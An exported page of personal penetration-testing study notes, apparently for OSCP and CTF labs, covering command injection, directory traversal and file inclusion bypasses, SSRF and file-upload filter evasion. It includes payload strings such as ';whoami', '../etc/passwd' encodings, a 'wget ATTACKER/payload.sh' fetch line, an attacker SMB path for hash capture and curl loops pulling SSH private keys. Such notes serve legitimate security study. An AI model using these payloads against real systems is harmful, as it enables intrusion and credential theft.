<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Attack Vectors</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Attack Vectors</h1><br/><p><a name="sinks"></a><h1>User Input (Sinks)</h1></p><p>Sinks include:</p><p></p><p><strong>URL</strong>: Parameters</p><p></p><p> <strong>Form Fields</strong>: Request Body Data</p><p> </p><p> <strong>HTTP Headers</strong></p><p> </p><p> <strong>Cookies</strong>: May be able to <span style="color:#ff0000;">inject straight into cookie</span>, or it <span style="color:#ff0000;">may be serialized data</span> that needs to be translated before injecting code &amp; then re-serialized. Also see <a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#Mass Assignment">Mass Assignment</a> vulnerability.</p><p></p><p><h2>★</h2><h2>Remove Parameters for Errors</h2><h3></h3></p><p><h3></h3>Errors can reveal info about Web App. <span style="color:#ff0000;">May get diff errors by</span> removing/modifying <span style="color:#ff0000;">diff params</span>, &amp; may only get errors with certain params. Test all.<h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><h2>Code Injection</h2></p><p>You may only find the vuln if you combine it with <a href="Recon_+_Services--WebApp_12.html#WAF Bypasses">Filter Bypasses</a>.</p><p><ul><li>Add specials characters. Changes to behavior, or error messages, can tell you about how the system works &amp; possibly indicate a vuln.</li></ul></p><p><ul><li>Could also be RCE/SQLi via CVE &amp; unqiue method, which may not be caught by usual SQL/RCE user input tests.</li></ul></p><p><ul><li>May need to URL-Encode some/all of a Req sent by Burp (i.e if it&#39;s in URL. Idk about body data).</li></ul></p><p><ul><li>May need to <span style="color:#ff0000;">end query with </span><strong><span style="color:#ff0000;">;</span></strong></li></ul></p><p><ul><li>Try <span style="color:#ff0000;">multiple payloads</span>. For example, a traditional Python Reverse Shell payload may fail whereas a payload like <strong>import os;os.system(&quot;B64_BASH&quot;)</strong> works.</li></ul></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Special Characters</span>: May need to test each of the <a href="file:///usr/share/wordlists/special_chars.txt">following</a> 1 at a time, but sometimes can try all at 1ce with a space between them (e.g. to see what output is returning or if an error is thrown).</p><p></p><p><strong> ! ` &#39; &quot; @ # $ % ^ &amp; * ( ) - _ = + \ | [ ] { } ; : / ? . &gt;</strong></p><p> </p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Sometimes anomalys only appear if using &gt;1 special characters. For example-</p><p></p><p><strong>`ls`</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>$(ls)</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>${ls}</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>{{ls}}</strong></p><p></p><p><h3>Manual Injection</h3></p><p>[CTF B 149]</p><p></p><p>May / may not need to URL-Encode the payload (including the special characters).</p><p></p><p>Sometimes you don&#39;t have the characters needed to run a payload directly, but can instead upload &amp; execute a reverse shell script!</p><p></p><p><span class="subheading">Testing Sinks</span>: There may only be 1 sink (e.g. form field) that is vuln to RCE, but others may still provide info that helps with exploiting the vulnerable sink.</p><p></p><p>For instance, if 1 field returns your output to you, it may tell you which special characters are accepted (e.g. only some are returned in output, or addition of some cause an error msg).</p><p></p><p><span class="subheading">Command Seperators</span>: Test all aforementioned special characters, but commands will often be seperated by 1 of the following.</p><p></p><p><strong>;</strong></p><p></p><p><strong>&amp;</strong> (for CMD)</p><p></p><p><strong>&amp;&amp;</strong> (For Linux or Powershell)</p><p></p><p><strong>|</strong> (Pipe)</p><p></p><p><strong>New Line</strong> (e.g. <strong>%0a</strong> if URL Encoded)</p><p></p><p><span style="color:#f6d32d;">★</span><span class="subheading">Null Byte</span>: %00 (etc)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Other special characters can still be useful for code execution. For example, Brackets ( { } or [ ] ) for Template Injection or Parameter Expansion).</p><p></p><p><span class="subheading">Adding a Space</span>: <strong>${IFS}</strong> is interpretted as a space by Linux systems!</p><p></p><p><span class="subheading">Omitting HTTP Prefix</span>: If running an HTTP webserver on port 80, can use <strong>wget</strong> or <strong>curl</strong> without protocol. Useful if you can&#39;t use <strong>:</strong> or if the target is filtering Requests with <strong>http://</strong>.</p><p></p><p><em>wget ATTACKER/payload.sh</em></p><p></p><p><span class="subheading">Omitting SMB Prefix</span>: If triggering a connection to your SMB Server (e.g. to capture a <a href="Misc_Attacks--Network_Attacks_14.html#capture ntlm">NetNTLM hash</a>), you don&#39;t need to specify a URL Protocol for your UNC Path.</p><p></p><p><em>\\ATTACKER\share\fake.txt</em><em></em></p><p><em></em><em></em></p><p><em>\\\\ATTACKER\\share\\fake.txt</em></p><p></p><p><h3>JSON Injection</h3></p><p>If input isn&#39;t properly sanitized, you can pass commands in a JSON query. For example,</p><p></p><p>{&quot;target&quot;:&quot;<strong>\&quot;</strong><span style="color:#ff0000;">;whoami</span> <strong>\&quot;</strong>&quot;}</p><p></p><p><span class="subheading">Resources</span>: <a href="https://book.hacktricks.xyz/pentesting-web/parameter-pollution#json-injection">Hacktricks</a>, <a href="https://h0j3n.medium.com/tryhackme-year-of-the-fox-631c7752fab2">example usage</a>, <a href="https://riptutorial.com/javascript/example/32217/evaled-json-injection">further reading</a>.</p><p></p><p><h3>Reading Binary Files</h3></p><p>Command injection lacks the interactive functionality needed to use a tool like <strong>sqlite3</strong>, but you can still <strong>cat</strong> the file to find valuable clear-text information inside the file.</p><p></p><p><h3>Automated Code Injection (commix)</h3></p><p>[Web App 28-29]</p><p><span style="color:#f66151;">NOT ON OSCP</span></p><p></p><p>Less reliable than manual testing, especially for things like JSON Injection!</p><p></p><p><span class="subheading">Specify Target</span></p><p></p><p><strong>URL</strong>: -u</p><p></p><p><strong>Target List</strong>: -m FILE</p><p></p><p><strong>Load Burp Request</strong>: -r FILE</p><p></p><p><span class="subheading">Example Query</span>: <em>commix -u http://athena.thm/myrouterpanel/ping.php -d &quot;ip=127.0.0.1&amp;submit=&quot;</em></p><p></p><p><h2>SQL Injection</h2></p><p>See <a href="SQL_1.html">SQLi</a>.</p><p></p><p>Often requires a quote appended to your query (<strong>&#39; </strong>or <strong>&quot;</strong>), but <span style="color:#ff0000;">sometimes it only works without quotes</span>!</p><p></p><p>Payload usually needs to come <span style="color:#ff0000;">after a valid query</span>, but sometimes it needs to come <span style="color:#ff0000;">after an invalid query</span>! (e.g. If there is only 1 user, a valid query could be <strong>?user=1</strong> &amp; an invlaid query could be <strong>?user=9</strong>)</p><p></p><p><h2>SSTI</h2></p><p>See <a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#SSTI">SSTI</a></p><p></p><p><h2>Accessing a URL</h2></p><p><h3>Attacker URL</h3></p><p>If the Web App can reach your server, it can result in the 1 or all of the following.</p><p></p><p><a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#Traversal & Inclusion">RFI</a></p><p></p><p><a href="Misc_Attacks--Network_Attacks_14.html#capture ntlm">Capture NetNTLM Hash</a></p><p></p><p><h3>Local URL</h3></p><p>The Web App may be able to reach some, or all, of the following:</p><p></p><p>Resources in the <span style="color:#ff0000;">same Web Server</span>, Resources on other Servers (<span style="color:#ff0000;">different</span> <span style="color:#ff0000;">ports </span>on the same machine), Host&#39;s <span style="color:#ff0000;">File System</span> (that aren&#39;t part of the Web App), or Resources on <span style="color:#ff0000;">other machines in the LAN</span>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Sometimes you need to <span style="color:#ff0000;">combine &gt;1 </span>of the following <span style="color:#ff0000;">attacks</span>!</p><p></p><p><a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#SSRF">SSRF</a></p><p></p><p><a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#Traversal & Inclusion">LFI</a></p><p></p><p><a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#Traversal & Inclusion">Directory Traversal</a></p><p></p><p></p><p><a name="Traversal & Inclusion"></a><h1>Directory Traversal &amp; File Inclusion</h1><h1></h1></p><p><h1></h1>[OSCP 54-54 &amp; WebApp 27-28]</p><p></p><p>If you think you have <strong>Dir Trav</strong>, test to see if you actually have <strong>LFI</strong> or <strong>RFI</strong> which can give you RCE (<strong>RFI</strong> can also be used to capture NetNTLM hashes)</p><p></p><p>LFI is similar to Dir Trav, except LFI will execute any files fetched. This can help you trigger webshells, but needs <a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#Inclusion R/ BE">additional steps</a> to read the Source Code of those files.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Reminder</span>: These vulns can occur in many diff contexts (e.g. a filename parameter from a <strong>multipart/form-data </strong>Req, a Resource that the page loads &amp; is shown by <strong>Network DevTool</strong>, etc). Same concepts apply regardless.</p><p></p><p>You sometimes need to <a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#Inclusion R/ BE">utilize alternate protocols</a> to trigger Directory Traversal or File Inclusion (e.g. <strong>php://</strong>, <strong>file://</strong>, etc).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If unsure how far back to traverse, overshoot it. A host can&#39;t go behind <strong>/</strong>, even if you add 20x Traversal Sequences, so adding too many shouldn&#39;t be an issue.</p><p></p><p><h2>Dectecting Vulnerability</h2></p><p>Sometimes a specific traversal sequence is needed.</p><p></p><p>Fuzz using files from <a href="file:///usr/share/seclists/Fuzzing/LFI/">/usr/share/seclists/Fuzzing/LFI/</a>. Some work better for a certain OS or certain server. Adjust the filter to exclude errors &amp;/or 404 pages.</p><p></p><p>For example, to Fuzz an Apache server running on Linux:</p><p> </p><p><em>ffuf -c -u “http://airplane.thm:8000/?page=FUZZ” -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 3</em></p><p></p><p><h2>Access Restricted Resources</h2></p><p>If a subdirectory normally throws an error like <strong>403 Forbidden</strong>, you may be able to bypass this with LFI or Dir Trav. For example,</p><p></p><p><strong>/secret.txt </strong>is restricted, but you can access it via <strong>/?post=secret.txt</strong></p><p></p><p><h2>Defenses &amp; Bypasses</h2></p><p>[Portswigger 13-14]</p><p></p><p>May need to <span style="color:#ff0000;">combine &gt;1 Bypass</span> Method.</p><p></p><p><h3>Blocked Traversal Sequences</h3></p><p>The Application may block characters like <strong>.</strong> (preventing <strong>../ </strong>syntax), even if they are URL-Encoded or 2x Encoded.</p><p></p><p><span class="subheading">Absolute Path</span>: Use an absolute path from the root of the File System to directly reference the file.</p><p></p><p><strong>/image?file=/etc/passwd</strong></p><p></p><p><h3>Stripped Traversal Sequences</h3></p><p>Some Applications strip a string of characters like<strong> ../</strong> from the Request.</p><p></p><p><span class="subheading">Nested Traversal Sequences</span>: Nested sequences may be stripped to convert them into simple traversal sequences. The following examples would be converted into <strong>/image?file=../../etc/passwd</strong>.</p><p></p><p><strong>/image?file=....//....//etc/passwd</strong></p><p></p><p><strong>/image?file=....\/....\/etc/passwd</strong></p><p></p><p><h3>Recursively Stripped Traversal Sequences</h3></p><p>Similar to the previous defense, but now the Application is stripping ALL traversal sequences.</p><p></p><p>In this case, you may be able to bypass this behavior with some form of URL-Encoding.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Some tools encode differently. For example, it <span style="color:#ff0000;">may not URL-Encode the </span><strong><span style="color:#ff0000;">.</span></strong> (e.g. <strong>../</strong> →<strong> ..%2F</strong>) but <span style="color:#ff0000;">you may need to</span>! Try <a href="https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=Li4v">CyberChef Encode all Special Characters</a>.</p><p></p><p><strong>/image?file=%252E%252E%252Fetc%252fpasswd</strong></p><p></p><p><span class="subheading">URL-Encoding</span>: The server or WAF may try removing traversal sequences before URL-Decoding is performed, thus allowing you to bypass the defense. For example, <strong>../</strong></p><p></p><p><strong>%2E%2E%2F</strong></p><p></p><p><span class="subheading">Double URL-Encoding</span>: Some servers will recursively perform URL-Decoding, wheras others will only URL-Decode 1ce before passing it to the Web Application. The latter behavior allows you to bypass defenses with 2x Encoding. For example, <strong>../</strong></p><p></p><p><strong>%252E%252E%252F</strong></p><p></p><p><span class="subheading">Non-Standard Encoding</span>: There may be mulitple forms of URL-Encoding that are accepted by the Application, &amp; an alt form may bypass defenses.  For example, <strong>../</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Normal tools failed to encode / decode this format, but the following came from Portswigger&#39;s Directory Traversal lesson. May still need to Encode the<strong> .</strong> shown below</p><p></p><p><strong>..%c0%af</strong></p><p></p><p><strong>..%ef%bc%8f</strong></p><p></p><p><h3>Require / Validate Base Folder</h3></p><p>The Application may be setup to only accept queries that begin with a specific Base Folder (e.g. <strong>/var/www/images</strong>).</p><p></p><p><span class="subheading">Bypass</span>: Start the Directory Traversal from that Base Folder if you know it (should be the directory on the Host FS where intended resources are saved).</p><p></p><p><strong>/image?file=/var/www/images/../../../etc/passwd</strong></p><p></p><p><h3>Require / Validate File Extension</h3></p><p>The Application may be setup to only accept queries for a specified file type.</p><p></p><p><span class="subheading">Null Byte</span>: You may be able to use some form of Null Byte syntax to terminate the file path before the required extension.</p><p></p><p><strong>/image?file=../../../etc/passwd%00.png</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Extension Added to User Input</span>: A Null Byte may also stop an App from appending an extension to your input.</p><p></p><p><h2>File Locations</h2></p><p>If trying to fetch Back-End Source Code, <span style="color:#ff0000;">may help to know the directory that content is being hosted at </span>(<span style="color:#ff0000;">unless you just traverse back like </span><strong><span style="color:#ff0000;">../</span></strong>).</p><p></p><p>There <span style="color:#ff0000;">may be more than 1 directory used to store BE code</span> (e.g if site has subdir, or server hosts multiple WebApps). For example-</p><p>files meant for users may be served at<strong> /var/www/html/</strong> &amp; files not meant for users may be served at <strong> /var/www/</strong></p><p></p><p><h3>Interesting Files</h3></p><p>See this <a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-inclusion/#interesting-files">list</a> of potentially valuable files.</p><p></p><p><h3>Finding Common Files</h3></p><p>If you can fetch any file, try looking for default files for the OS that have universal R/ access. However, sometimes you can only fetch files inside webroot.</p><p></p><p><span class="subheading">Windows</span>: file://<strong>/Windows/System32/drivers/etc/hosts</strong>		OR <span style="color:#ff0000;">May need Drive Letter</span> also! For example, file://<strong>C:/Windows/System32/drivers/etc/hosts</strong>			OR <strong>\Windows\System32\drivers\etc\hosts</strong></p><p></p><p><span class="subheading">Windows Alternate File</span>: <strong>C:\Windows\Win.ini</strong></p><p></p><p><span class="subheading">Linux</span>: file://<strong>/etc/hosts</strong></p><p></p><p><h3>Finding Host Directory</h3></p><p>Find this directory by <span style="color:#ff0000;">searching for a known file</span>. For ex, if you can nav to<strong> /index.html</strong> via browser, try fetching that with dir trav.</p><p></p><p>See my list of <a href="file:///usr/share/wordlists/linux_WebApp_dirs.txt">Common Dirs</a> used to host Linux WebApps, &amp; the one from <a href="file:///usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt">Seclists</a> (uses a different format which may need to be modified).</p><p></p><p>★<span style="color:#f66151;text-decoration:underline;">WARNING</span>★: Just because you can&#39;t find some files that are in the SW&#39;s Repo (i.e the Github page), that doesn&#39;t mean the same is true for other files!</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: When looking for files, <span style="color:#ff0000;">ANY diff in output is interesting</span>! If valid files usually return that page, invalid files output an error, &amp; no output is returned for other files, the files that don&#39;t return output may be telling you something!</p><p></p><p><h2>Finding Files without Directory Listing</h2></p><p>[CTF B 25]</p><p></p><p><a name="Find SSH Key"></a><h2>Finding SSH Keys</h2></p><p>The private SSH key is typically <strong>id_rsa</strong> by def, but could have <span style="color:#ff0000;">diff name</span> (either <a href="file:///usr/share/wordlists/ssh_PrivKey_names.txt">diff def</a> name <span style="color:#ff0000;">due to  algorithm used</span>, a custom name,  SSH ver?, etc).</p><p>For ex, kali&#39;s SSH ver now uses diff algorithm which means def name is <strong>id_ecdsa</strong>.</p><p></p><p><strong>id_rsa</strong><strong></strong></p><p><strong>id_ecdsa</strong><strong></strong></p><p><strong>id_dsa</strong></p><p></p><p><em>for i in $(cat users.txt); do for k in $(cat /usr/share/wordlists/ssh_PrivKey_names.txt); do echo &quot;User: $i&quot;; echo &quot;Key Name: $k&quot;; curl --path-as-is &quot;http://192.168.239.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/$i/.ssh/$k&quot;; echo &quot;===============&quot;; done; done</em></p><p></p><p><h3>Determine Who has SSH Setup</h3></p><p>If you don&#39;t have Directory Listing, &amp; can&#39;t find the key at<strong> /home/USER/.ssh/id_rsa</strong> (or any of the other def Key Names, you may be find <strong> /home/USER/.ssh/authorized_keys</strong> which  suggests which users have SSH setup. For ex,</p><p></p><p><em>for i in $(cat users.txt); do curl --path-as-is &quot;http://192.168.239.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/$i/.ssh/authorized_keys&quot;; done</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: The contents of the <strong>authorized_keys</strong> file will tell you the algorithm used for the SSH priv key, giving you a hint as to its name. For ex, output incl <em>ecdsa-sha2-nistp256</em> hints that priv key could be named <strong>id_ecdsa</strong></p><p></p><p><h2>File Inclusion</h2></p><p>[WebApp 27-28]</p><p></p><p><h3>In Diff Contexts</h3></p><p><span class="subheading">Params</span>: For ex, </p><p><strong>?view=</strong><strong></strong></p><p><strong>?download=</strong><strong></strong></p><p><strong>?conf=</strong><strong></strong></p><p><strong>?date=</strong><strong></strong></p><p><strong>?include=</strong></p><p>(see Parrot for wordlist of most common vuln params)</p><p></p><p><span class="subheading">Other Protocols</span>:</p><p></p><p><span class="subheading">Via email</span>:</p><p></p><p><a name="Inclusion R/ BE"></a><h3>Reading Source Code</h3></p><p>You may be able to change the protocol used to fetch the file. </p><p></p><p>For example, if <strong>file.php</strong> is fetched via <strong>http://</strong>, it&#39;ll be interpreted &amp; executed.</p><p></p><p>However, if the file is fetched with<strong> file://</strong> or <strong>php://</strong>, you may be able to read it (or perform additional actions if PHP Wrappers are supported).</p><p></p><p><h3>PHP Wrappers</h3></p><p>[Web App 21]</p><p></p><p>See <a href="https://hacktricks.boitatech.com.br/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers">Hacktricks</a> for info regarding protocol wrappers.</p><p></p><p>To fetch source code w/o executing it/rendering the pg, may be able to encode it. For ex, using PHP wrappers (i.e b64 encoding).</p><p></p><p>If they&#39;re enabled, there are wrappers (e.g <strong>data</strong>) that&#39;ll directly give <span style="color:#ff0000;">RCE</span>.</p><p></p><p><h3>Using Webshell</h3></p><p>If you&#39;re using File Inclusion to trigger a webshell that takes commands from a URL parameter (i.e. simple-backdoor.php), use <strong>&amp;</strong> to append that param. For example,</p><p></p><p><strong>/?post=/home/ftpuser/ftp/file/shell.php&amp;cmd=PAYLOAD</strong></p><p></p><p><h2>Enumerate Linux Service / Networking Info</h2></p><p>In Linux, “everything is a file.” You can <a href="https://idafchev.github.io/enumeration/2018/03/05/linux_proc_enum.html">determine what ports are in use</a> via R/ access to the FS. For example, check <strong>/proc/net/tcp</strong> to get TCP ports.</p><p></p><p>The contents of this file are B64 Encoded (&amp; many normal tools fail to translate it properly). You can paste results into ChatGPT, but cross check results (i.e. port numbers) with this <a href="https://coolconversion.com/math/binary-octal-hexa-decimal/_hex__7F_to_decimal_">tool</a> (2 characters at a time).</p><p></p><p><a name="SVC Enum via Dir Trav / LFI"></a><h3>Get Service Info</h3></p><p>To get more information about the SVC that&#39;s running on a specific port, you need to find its PID. The info is stored in <strong>/proc/PID/cmdline</strong>.</p><p></p><p>Use the following <a href="Appendix--Code_80.html#Enumerate Linux Services">script</a> to BF the PID for a service running on a specified port. May need to edit the PID range.</p><p></p><p><a name="SSRF"></a><h1>SSRF</h1></p><p>[Portswigger 96-104]</p><p></p><p>Allows you to access restricted resources, like URLs that require authentication (e.g. <strong>Status 401 Unauthorized</strong> or <strong>Status 403 Forbidden</strong>) or other <span style="color:#ff0000;">Back End Systems which aren&#39;t externally accessible</span>.</p><p></p><p><h2>SSRF Against APIs</h2></p><p>[CTF D 23]</p><p></p><p>Sometimes a Web Server routes certain Requests through an internally accessible API. Although you may be able to reach the same endpoints on the Web App, you may need to <span style="color:#ff0000;">use SSRF to query the API directly</span> in order to bypass restrictions.</p><p></p><p>For example, using <strong>http://cloudsite.thm/api/docs </strong>gives you a 403, but <strong>http://127.0.0.1:3000/api/docs</strong> works.</p><p></p><p><h2>Example Use Case</h2></p><p>[CTF B 145-146]</p><p></p><p>Target had 2 subdomains <strong>admin.ironcorp.me</strong> (Gave 403 Forbidden, unless authenticated using HTTP Basic Auth) &amp; <strong>internal.ironcorp.me</strong> (Gave 401 Unauthorized).</p><p></p><p>Brute Forced <a href="Misc_Attacks--Password_Attack_5.html#WebApp Brute Force">HTTP Basic Auth</a> to access <strong>admin.ironcorp.me</strong> &amp; it had a form field vuln to RFI, LFI, &amp; SSRF. Entered the following URL into the form field bypassed the <strong>403 Forbidden</strong>.</p><p></p><p><strong>http://internal.ironcorp.me:11025/</strong></p><p></p><p><h3>Combining with LFI</h3></p><p>Since it was LFI, the source code for this page was embedded into the current page. Right Click &amp; <strong>View Source Code</strong> to see reference to subdir<strong> /name.php?name=</strong>. Use SSRF to Request the following.</p><p></p><p><strong>http://internal.ironcorp.me:11025/name.php</strong></p><p></p><p>Threw error since it was expecting a parameter. <strong>View Source Code</strong> again for details. The following error revealed the Directory used for Web App.</p><p></p><p><strong>Unidentified Index: name in E:\xampp\htdocs\internal\name.php</strong>...</p><p></p><p>Now that you know the File Path, change the Protocol used to fetch it to read the code via LFI. In this case, substitue<strong> \</strong> for<strong> /</strong></p><p></p><p><strong>file://E:/xampp/htdocs/internal/name.php</strong></p><p></p><p><h3>Combining with Code Injection</h3></p><p>The file contents retrieved were as follows.</p><p></p><p><strong>&lt;?php $cmd = “echo Equinox”.$_REQUEST[&#39;name&#39;]; passthru($cmd);?&gt;</strong></p><p></p><p>In PHP, <strong>passthru() </strong>works similarly to <strong>exec()</strong> or <strong>system()</strong> &amp; can be abused for RCE. This code appends the value of the name URL parameter to the string &amp; outputs the result via <strong>echo</strong>.</p><p></p><p>Tell the system to expect 2 commands by testing out the special characters for <a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#sinks">Code Injection</a>. In this case, the BE was using CMD, so you needed <strong>&amp;</strong>. In this case, the value of the <span style="color:#ff0000;">URL Parameter</span> also <span style="color:#ff0000;">needed to be URL-Encoded</span>.</p><p></p><p><strong>http://internal.ironcorp.me:11025/name.php=%26%20whoami</strong></p><p></p><p>The host OS interpretted this as: <strong>echo Equinox &amp; whoami</strong>. Use this syntax to get a Web Shell.</p><p></p><p><h2>OPSEC</h2></p><p>Another use of SSRF is obscuring the origin of an Attack, by making it appear as if the malicious actions origniate at the target server.</p><p></p><p><h1>File Uploads</h1></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files">PayloadsAlltheThings</a></p><p></p><p>Always test with innocuous file type like <strong>.txt </strong>to see if any format is accepted (may need to try multiple benign formats like <strong>.jpg</strong>, etc)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: <span style="color:#ff0000;">Even if one method </span>of File Upload <span style="color:#ff0000;">doesn&#39;t put files in accessible location</span>, <span style="color:#ff0000;">another method</span> of File upload <span style="color:#ff0000;">may work</span>!</p><p></p><p>For ex- Uploads through FTP server didn&#39;t appear, but uploads through TFTP server did!</p><p><ul><li><span style="color:#ff0000;">If target has &gt;1 Web Server</span>, 1 may be used to upload file &amp; the other may be used to view/interact</li></ul></p><p><ul><li>★ May be able to <span style="color:#ff0000;">upload a file via another service</span> (e.g <a href="Recon_+_Services--FTP_13.html">FTP</a> or <a href="Recon_+_Services--SMB_11.html">SMB</a>) &amp; access it with certain URL in the <a href="Recon_+_Services--WebApp_12.html">WebApp</a></li></ul></p><p><ul><li><span style="color:#ff0000;">If uploading a binary file via </span><a href="Recon_+_Services--FTP_13.html">FTP</a><span style="color:#ff0000;">, switch the transfer mode</span>. Connect with <em>ftp</em> then enter <em>binary</em> (OSCP 131)</li></ul></p><p><ul><li>Some file formats may appear to be accepted (giving “Upload Successful”), but won&#39;t actually appear. (e.g ASPX webshell worked, but ASP webshell was 404)</li></ul></p><p><ul><li>May be able to <span style="color:#ff0000;">replace files</span> for RCE. For ex- <a href="Recon_+_Services--WebApp--Software--ASP.NET_25.html#asp">ASP.NET</a> Master Page, which uses a file format which is <span style="color:#ff0000;">less likely to be blocked</span> than the obvious ones. Try to get a copy of the OG file 1st, you <span style="color:#ff0000;">may break the site</span>!</li></ul></p><p><ul><li>May need correct <span style="color:#ff0000;">Domain Name</span> to upload &amp;/or to resolve a webshell!</li></ul></p><p><ul><li>If target has <span style="color:#ff0000;">&gt;1 FTP server</span> (e.g FTP &amp; tFTP), <span style="color:#ff0000;">only 1 may upload to accessible location</span>!</li></ul><em></em></p><p><em></em></p><p><a name="upload scanner"></a><h2>Automated Scanner</h2></p><p>[CTF B 191-192]</p><p></p><p>Try this <a href="file:///home/asura/git/Upload_Bypass">tool</a> to test for restrictions &amp; bypasses. Somewhat unreliable?</p><p></p><p>Has 3 modes: Detection (<strong>-d</strong>), Exploitation (<strong>-e</strong>), &amp; Anti-Malware (tests for things like AV)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Navigate to the <span style="color:#ff0000;">Repo&#39;s directory</span> &amp; run the tool from there</p><p></p><p><h3>Setup</h3></p><p>Capture a Request with Burpsuite, send to Repeater, <span style="color:#ff0000;text-decoration:underline;">edit the fields</span> as specified on the <a href="https://github.com/sAjibuu/Upload_Bypass">Github page</a>, Right Click &amp; <strong>Save Item</strong>. (Example of edits on CTF B 192]</p><p></p><p><h3>Detection</h3></p><p><span class="subheading">Basic Usage</span>: Specify the Extension to test (e.g. if you want to find a bypass to upload PHP files). It will automatically determine supported file types, &amp; test for ways to upload the sepcified file type.</p><p></p><p><em>python3 upload_bypass.py -r ~/pentest/ctf/saved_request -E php -d</em></p><p></p><p><span class="subheading">Fancy Usage</span>: Some of these arg&#39;s are optional (verify that I&#39;m using <strong>-D</strong> correctly). Use <strong>-R</strong> to print the Resp to help with debugging.</p><p></p><p>In this ex, Req&#39;s sent to target&#39;s :80 are being redirected to :443 (HTTPS), so using <strong>--allow_redirects</strong> *should* get Req&#39;s sent to the right place.</p><p></p><p><em>python3 upload_bypass.py -E php -A gif -e -R --allow_redirects -r ~/pentest/ctf/saved_request -s “uploaded to: ../data/usrimg/” -D /assets/data/userimg</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If you stop the scan, you can continue it by using <strong>--resume</strong> &amp; specifying the JSON save file.</p><p></p><p><h3>Troubleshooting</h3></p><p><span class="subheading">Connection refused (HTTPS instead of HTTP)</span>: The tool was trying to connect to the target via HTTPS, even though it didn&#39;t have an HTTPS server running &amp; port 443 wasn&#39;t referenced in the Burp Req.</p><p></p><p>I was able to fix this by routing the traffic through burp &amp; specifying HTTP with<strong> --burp_http</strong></p><p></p><p><em>python3 upload_bypass.py -r /dev/shm/burp_req -E php -d --burp_http -s &quot;O arquivo foi upado com sucesso&quot;</em></p><p></p><p><h2>Troubleshooting</h2><h2></h2></p><p><h2></h2><h3>Identifying the Issue</h3></p><p>If an upload isn&#39;t working, try ruling out as many potential causes as possible (there <span style="color:#ff0000;">may be &gt;1 issues</span> though!). Sometimes the Web App will return a failure message which lists potential causes for failure. For example,</p><p></p><p><strong>ERROR: shell.php is not an image or exceeds the Webserver&#39;s upload size limit</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: It could also be failing for a reason which is not referenced by the Webserver!</p><p></p><p><span class="subheading">Accepted File Types</span>: Try uploading an unmodified file that&#39;s an accepted type (e.g. a normal JPEG). Test all accepted formats. If upload works, you&#39;re likely being blocked due to the file type &amp; can try employing <a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#Upload Filter Bypass">Filter Bypasses</a>.</p><p></p><p><span class="subheading">Size Limits</span>: Try uploading a small file with the correct file type (e.g. a tiny JPEG). If that works, you can try uploading a file with a very <a href="Appendix--Code--PHP_89.html#Tiny Payload">small payload</a>.</p><p></p><p><span class="subheading">Prohibited File Contents</span>: See if you can get benign RCE (e.g. printing “Hello World”). Something like a WAF could be stopping uploads with certain “dangerous” functions. See below for example with PHP.</p><p></p><p><h3>★</h3><h3>PHP RCE</h3></p><p>If there&#39;s an issue with code execution of any kind (incl Code Injection, an uploaded backdoor, etc), you can get config info with the following commands.</p><p></p><p>One thing it shows is <span style="color:#ff0000;">disabled functions</span> (e.g. if <strong>system()</strong>, <strong>exec()</strong>, etc is blocked.</p><p></p><p><em>phpinfo()</em></p><p></p><p><a name="Upload Filter Bypass"></a><h2>Filter Bypass</h2></p><p>May get message about <strong>File Upload Failing</strong>, <span style="color:#ff0000;">or</span> you may just get <strong>403 Forbidden</strong> <span style="color:#ff0000;">when trying to Nav to the Webshell</span>.</p><p></p><p>Sometimes neccesary to <span style="color:#ff0000;">combine multiple bypass methods</span>, depending what check(s) are perfomed.</p><p></p><p>If you can&#39;t bypass a filter with a working payload, try another vector like <span style="color:#ff0000;">embedding a malicious macro</span>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: It may help to use the <a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#upload scanner">automated scanner</a>.</p><p><ul><li>Change the case of the file ext (e.g <strong>.php </strong>-&gt; <strong>.pHP</strong>)</li></ul></p><p><ul><li>Try less common 